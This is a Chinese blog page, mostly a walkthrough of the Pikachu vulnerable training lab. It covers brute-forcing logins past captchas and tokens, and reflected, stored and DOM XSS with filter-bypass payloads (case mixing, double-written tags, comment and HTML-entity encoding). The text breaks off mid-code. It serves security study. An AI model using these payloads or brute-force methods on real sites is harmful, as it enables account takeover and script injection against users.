<li><strong>redis–&gt;渗透测试 搞清楚，一步一步来</strong></li>
<li>去拿到各种SRC的证书。</li>
<li>知识积累，突变（量变转质变）web后期一定会是二进制.–横向贯彻(各个方向都要)</li>
<li>未接触领域,善于找标签:岗位体系–&gt;需要什么知识体系–&gt;将自己的标签和他对应上。标签需要很详细到某方面,类似于安全设备配置这样,而不是安全配置.</li>
<li>每天一篇：电子取证领域的论文</li>
</ol>
<h3 id="为何高分低能？"><a href="#为何高分低能？" class="headerlink" title="为何高分低能？"></a>为何高分低能？</h3><p>考试是采样,高分低能就是这样.采样是点,然而交流或者应用是连续.采样题是无聊的,宽泛的,面试其实也是,都是连续交流,其实开卷反而更难.</p>
<p>参考：</p>
<p>认证业务平台:<a target="_blank" rel="noopener" href="http://cstc.cncstea.cn/">http://cstc.cncstea.cn</a></p>
<p><a target="_blank" rel="noopener" href="http://examanage.cncstea.cn/">http://examanage.cncstea.cn</a></p>
<p>​    </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/28/pikachu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/28/pikachu/" class="post-title-link" itemprop="url">pikachu靶场通关指南(一)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-28 16:05:10" itemprop="dateCreated datePublished" datetime="2021-04-28T16:05:10+08:00">2021-04-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-04 11:34:00" itemprop="dateModified" datetime="2021-05-04T11:34:00+08:00">2021-05-04</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span></span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>NaN:aN</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近需要找实习了，来Pikachu靶场再复习一下重要类型的漏洞，具体搭建指南网上应有尽有，此处不再赘述。</p>
<h1 id="Burt-Force"><a href="#Burt-Force" class="headerlink" title="Burt Force"></a>Burt Force</h1><h3 id="相关："><a href="#相关：" class="headerlink" title="相关："></a>相关：</h3><p>安全认证策略:<br>用户密码设置是否足够复杂</p>
<p>每次认证是否使用安全验证码</p>
<p>对尝试登陆的行为是否进行判断和限制(连续5次错误登陆锁定账号等)</p>
<p>是否采用双因素认证</p>
<h3 id="经验："><a href="#经验：" class="headerlink" title="经验："></a>经验：</h3><h4 id="暴力破解流程"><a href="#暴力破解流程" class="headerlink" title="暴力破解流程"></a>暴力破解流程</h4><ul>
<li>找到登录接口的脆弱性<ul>
<li>尝试登录—抓包—观察验证元素和response，判断是否可以暴力破解</li>
</ul>
</li>
<li>优化字典</li>
<li>自动化工具</li>
</ul>
<h4 id="生成高效字典"><a href="#生成高效字典" class="headerlink" title="生成高效字典"></a>生成高效字典</h4><ul>
<li>比如常用的用户名/密码TOP500</li>
<li>脱裤后的账号密码（社工库）</li>
<li>根据特定的对象（比如手机、生日和银行卡号等）按照指定的规则来生成密码</li>
</ul>
<h4 id="字典优化技巧"><a href="#字典优化技巧" class="headerlink" title="字典优化技巧"></a>字典优化技巧</h4><ul>
<li>根据注册提示进行优化，如注册要求密码8位以上，就去掉少于8位的密码</li>
<li>爆破管理后台时，账号是 admin / administrator / root 的可能性较高</li>
</ul>
<h2 id="验证码绕过-on-server-服务器"><a href="#验证码绕过-on-server-服务器" class="headerlink" title="验证码绕过(on server)服务器"></a>验证码绕过(on server)服务器</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;用户名不能为空&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;密码不能为空&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;vcode&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;验证码不能为空哦！&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//              验证验证码是否正确</span></span><br><span class="line">                <span class="keyword">if</span> (strtolower(<span class="variable">$_POST</span>[<span class="string">&#x27;vcode&#x27;</span>]) != strtolower(<span class="variable">$_SESSION</span>[<span class="string">&#x27;vcode&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;验证码输入错误哦！&lt;/p&gt;&quot;</span>;</span><br><span class="line">                    <span class="comment">//应该在验证完成后,销毁该$_SESSION[&#x27;vcode&#x27;]</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">                    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">                    <span class="variable">$vcode</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;vcode&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=? and password=md5(?)&quot;</span>;</span><br><span class="line">                    <span class="variable">$line_pre</span> = <span class="variable">$link</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$line_pre</span>-&gt;bind_param(<span class="string">&#x27;ss&#x27;</span>,<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$line_pre</span>-&gt;execute())&#123;</span><br><span class="line">                        <span class="variable">$line_pre</span>-&gt;store_result();</span><br><span class="line">                        <span class="comment">//虽然前面做了为空判断,但最后,却没有验证验证码!!!</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$line_pre</span>-&gt;num_rows()==<span class="number">1</span>)&#123;</span><br><span class="line">                            <span class="variable">$html</span>.=<span class="string">&#x27;&lt;p&gt; login success&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="variable">$html</span>.= <span class="string">&#x27;&lt;p&gt; username or password is not exists～&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$html</span>.= <span class="string">&#x27;&lt;p&gt;执行错误:&#x27;</span>.<span class="variable">$line_pre</span>-&gt;errno.<span class="string">&#x27;错误信息:&#x27;</span>.<span class="variable">$line_pre</span>-&gt;error.<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码中比较完验证码后，并没有销毁该验证码。所以猜测验证码一直有效，可以不停重放数据包。</p>
<p>所以可以通过验证码重放，来绕过验证码爆破用户民共和密码。</p>
<p><img src="/2021/04/28/pikachu/1.png"></p>
<p><img src="/2021/04/28/pikachu/2.jpg"></p>
<p><img src="/2021/04/28/pikachu/3.png"></p>
<p>成功爆破出目前pikachu的用户及密码</p>
<h2 id="验证码绕过-on-client-服务器"><a href="#验证码绕过-on-client-服务器" class="headerlink" title="验证码绕过(on client)服务器"></a>验证码绕过(on client)服务器</h2><p>可以看到用js生成随机字符作为验证码候选，然后创建验证码并进行验证。所以在本案例下，可利用知道用户名或密码的前提下，可以对另一个参数进行暴力枚举。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> code; <span class="comment">//在全局 定义验证码</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createCode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> codeLength = <span class="number">5</span>;<span class="comment">//验证码的长度</span></span><br><span class="line">        <span class="keyword">var</span> checkCode = <span class="built_in">document</span>.getElementById(<span class="string">&quot;checkCode&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> selectChar = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>);<span class="comment">//所有候选组成验证码的字符，当然也可以用中文的</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; codeLength; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> charIndex = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">36</span>);</span><br><span class="line">            code += selectChar[charIndex];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//alert(code);</span></span><br><span class="line">        <span class="keyword">if</span> (checkCode) &#123;</span><br><span class="line">            checkCode.className = <span class="string">&quot;code&quot;</span>;</span><br><span class="line">            checkCode.value = code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> inputCode = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#bf_client .vcode&#x27;</span>).value;</span><br><span class="line">        <span class="keyword">if</span> (inputCode.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            alert(<span class="string">&quot;请输入验证码！&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inputCode != code) &#123;</span><br><span class="line">            alert(<span class="string">&quot;验证码输入错误！&quot;</span>);</span><br><span class="line">            createCode();<span class="comment">//刷新验证码</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    createCode();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Token防爆破"><a href="#Token防爆破" class="headerlink" title="Token防爆破"></a>Token防爆破</h2><p>抓包发现有 token</p>
<p><img src="/2021/04/28/pikachu/3.jpg"></p>
<p>Repeater后可以看到返回包里有新的 token，即下一次登陆要使用的 token 值在此次登陆的返回包里，而且是明文传输，所以爆破时一定是单线程。</p>
<p><img src="/2021/04/28/pikachu/4.jpg"></p>
<p>intruder模块：设置Grep Extract</p>
<p><img src="/2021/04/28/pikachu/5.jpg"></p>
<p>设置线程为1</p>
<p><img src="/2021/04/28/pikachu/6.jpg"></p>
<p><img src="/2021/04/28/pikachu/7.jpg"></p>
<p>添加返回包里的 token 值，有效载荷选递归搜索</p>
<p><img src="/2021/04/28/pikachu/9.jpg"></p>
<p>成功爆破</p>
<p><img src="/2021/04/28/pikachu/8.jpg"></p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>对XSS的熟悉程度取决于对浏览器机制和HTML、JS的了解程度。这部分涉及内容较多，需要多加练习。</p>
<h2 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h2><p>比较好绕过，F12更改输入框maxlength，或者直接在URL中补全&lt;/script&gt;即可。js代码正确即可被浏览器执行。</p>
<p><img src="/2021/04/28/pikachu/10.jpg"></p>
<h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><p>此处同上，只不过URL不显示</p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>注入语句会写入数据库中，每次进入都会执行</p>
<p>同上</p>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>DOM: Document Object Model文档对象模型，DOM型XSS是一种特殊类型的反射型XSS。</p>
<p>当网页到达浏览器，浏览器会为网页创建一个Document object文档对象，然后生成各个子文档对象，其中<strong>每个页面元素对应一个文档对象</strong>，每个文档对象包含属性、方法和事件。</p>
<p>我们可以通过JS脚本对文档对象进行编辑从而修改页面的元素。<strong>客户端脚本程序可以通过DOM来动态修改页面内容，客户端获取DOM中的数据并在本地执行</strong>。基于此，JS脚本就可以用来实现XSS。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;xssd_main&quot;</span>&gt;</span><br><span class="line">               &lt;script&gt;</span><br><span class="line">                   <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                       <span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">                       <span class="built_in">document</span>.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line">                   <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">               &lt;/script&gt;</span><br><span class="line">               &lt;!--<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>--&gt;</span></span><br><span class="line"><span class="xml">               <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">               <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;click me!&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;domxss()&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">               <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;dom&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">           <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>通过 getElementById 获取到了标签 Id 为 text的内容赋值给str</p>
<p>  然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，而a标签会写到<strong>Id 为 dom</strong>的 div 标签中。</p>
<p>因此通过闭合的方式构造Payload</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=alert(&quot;xss&quot;)&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/28/pikachu/11.jpg"></p>
<p>DOM型XSS不经过后台交互，前端输入被DOM给获取，通过DOM又在前端输出</p>
<h2 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;xssd_main&quot;</span>&gt;</span><br><span class="line">                &lt;script&gt;</span><br><span class="line">                    <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                        <span class="keyword">var</span> str = <span class="built_in">window</span>.location.search;</span><br><span class="line">                        <span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.split(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">                        <span class="keyword">var</span> xss = txss.replace(<span class="regexp">/\+/g</span>,<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"><span class="comment">//                        alert(xss);</span></span><br><span class="line"></span><br><span class="line">                        <span class="built_in">document</span>.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+xss+<span class="string">&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line">                    <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">                &lt;/script&gt;</span><br><span class="line">                &lt;!--<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>--&gt;</span></span><br><span class="line">                &lt;form method=&quot;get&quot;&gt;</span><br><span class="line">                &lt;input id=&quot;text&quot; name=&quot;text&quot; type=&quot;text&quot;  value=&quot;&quot; /&gt;</span><br><span class="line">                &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;请说出你的伤心往事&quot;/&gt;</span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;dom&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>首先定义一个domxss函数：</p>
<p>利用 window.location.search 获取浏览器中URL的内容，然后赋值给 str</p>
<p>然后经过URL解码和字符串分隔，取出URL中的参数内容；</p>
<p>把 “+” 替换为 “ ”（空格），赋值给 xss；</p>
<p>把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中。</p>
<p>与之前DOM不同的是，它的输入是从浏览器的URL中获取的，很像反射型XSS(get)</p>
<p>构造的Payload同上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><p>为攻击场景，输入的内容不会在当前输出，而是提交到后台。若输入一串js，管理员登录后台管理界面，后台会输出我们提交的内容</p>
<p>输入常见xss一句话，登陆管理员界面即可看到一登陆进来就遭受攻击。</p>
<h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p>常见xss一句话输入，被后台过滤，大小写即可绕过。也可用&lt;img src=x onerror=alert(‘xss’)&gt;。</p>
<p>实际场景中，或多或少都会有过滤，但是有些逻辑不严谨，也可被绕过。</p>
<p>绕过思路：</p>
<ul>
<li><strong>前端限制绕过</strong>：直接抓包重放，或修改html前端代码。如反射型XSS(get)中限制输入20个字符。</li>
<li><strong>大小写</strong>：比如<SCRIPT>aLeRT(111)。后台可能用正则表达式匹配，如果正则里面只匹配小写，那就可能被绕过。</SCRIPT></li>
<li><strong>双写</strong>：&lt;scri<script>pt>alert(111)</scri</script>pt&gt;。针对后台把<script>标签去掉换，但可能只去掉一次。</li>
<li><strong>注释干扰</strong>：&lt;scri<!--test-->pt&gt;alert(111)&lt;/sc<!--test-->ript&gt;。加上注释后可能可以绕过后台过滤机制。</li>
<li><strong>编码</strong>：后台过滤特殊字符，如<script>标签，但该标签可被各种编码，或许可以绕过。(浏览器会对某些编码进行识别，翻译成正常的标签执行)</li>
</ul>
<blockquote>
<h5 id="浏览器的解码顺序："><a href="#浏览器的解码顺序：" class="headerlink" title="浏览器的解码顺序："></a><strong>浏览器的解码顺序：</strong></h5><p>浏览器的解码顺序和解析顺序不同。浏览器一般的解码顺序是：html解码–&gt;javascript解码–&gt;浏览器的url解码.</p>
<p>这里的url解码和发送到服务器的url解码不同，那个过程是由服务器来完成的，而不是浏览器。</p>
</blockquote>
<p> <strong>属性标签不会正常解析URL编码，因此不会执行</strong></p>
<blockquote>
<p>&lt;img src=x onerror=alert(‘xss’)&gt;</p>
<p>将alert(‘xss’)进行URL编码，可以执行吗？</p>
<img src=x onerror=alert%28%27xss%27%29>
</blockquote>
<p><strong>HTML编码可以被浏览器解析，因此会执行</strong></p>
<blockquote>
<p>&lt;img src=x onerror=alert(‘xss’)&gt;将alert(‘xss’)进行HTML编码<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;></p>
</blockquote>
<h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p>htmlspecialchars()：<strong>对特殊字符进行转义</strong></p>
<p>  预定义字符包括：</p>
<ul>
<li><p>&amp; 成为 &amp;amp</p>
</li>
<li><p>“ 成为 &amp;quot</p>
</li>
<li><p>‘ 成为 &amp;#039</p>
</li>
<li><p>&lt; 成为 &amp;lt</p>
</li>
<li><p>&gt; 成为 &amp;gt</p>
<p>可用引号类型</p>
</li>
<li><p>ENT_COMPAT：默认，仅编码双引号</p>
</li>
<li><p>ENT_QUOTES：编码双引号和单引号</p>
</li>
<li><p>ENT_NOQUOTES：不编码任何引号</p>
</li>
</ul>
<blockquote>
<p>默认：对输入直接进行过滤。</p>
<p>建议用ENT_QUOTES,对单双引号都进行过滤</p>
</blockquote>
<p>测试，查看htmlspecialchars是否过滤单双引号：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111&#39;&quot;&lt;&gt;&amp;</span><br></pre></td></tr></table></figure>

<p><img src="4.png"></p>
<p>可以对于单引号未进行编码，因此构造Payload:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></figure>

<p>审计后端代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;输入点啥吧！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对&#x27;处理</span></span><br><span class="line">        <span class="variable">$message</span>=htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">        <span class="variable">$html1</span>.=<span class="string">&quot;&lt;p 